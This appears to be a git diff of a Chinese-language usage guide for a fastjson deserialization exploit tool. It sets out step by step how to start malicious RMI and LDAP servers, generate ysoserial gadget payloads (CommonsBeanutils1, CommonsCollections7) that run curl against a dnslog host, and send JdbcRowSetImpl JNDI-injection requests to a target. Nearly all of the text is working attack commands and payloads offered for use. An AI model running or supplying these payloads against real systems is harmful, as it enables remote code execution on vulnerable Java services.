@@ -5,7 +5,7 @@
 
 rmi:
 1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
-java -cp fastjson_tool.jar EvilRMIServer 8888 53 "curl wyzxxz.cn"
+java -cp fastjson_tool.jar EvilRMIServer 8888 53 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -16,15 +16,18 @@ Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ip:8888/Object","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8888/Object","autoCommit":true}
 
 3. 查看日志是否curl成功
 
-
+===================================================================================================
 
 ldap:
 1. 用下面命令生成base64编码过的测试语句
-java -jar ysoserial6.jar URLDNS 'http://wyzxxz.cn'|base64 > base64_payload_file
+java -jar ysoserial6.jar URLDNS 'http://dnslog.wyzxxz.cn'|base64 > base64_payload_file
+常用的例如：
+java -jar ysoserial6.jar CommonsBeanutils1 'curl dnslog.wyzxxz.cn'|base64 > base64_payload_file
+java -jar ysoserial6.jar CommonsCollections7 'curl dnslog.wyzxxz.cn'|base64 > base64_payload_file
 
 2. 启动LDAP服务
 java -cp fastjson_tool.jar LDAPRefServer2 8888  base64_payload_file
@@ -38,10 +41,12 @@ Connection: close
 Accept: */*
 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:8888/Object","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}
+
 
 4. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。
 
+===================================================================================================
 else:
 
 有些环境可能利用不成功，可以尝试默认的测试方法,
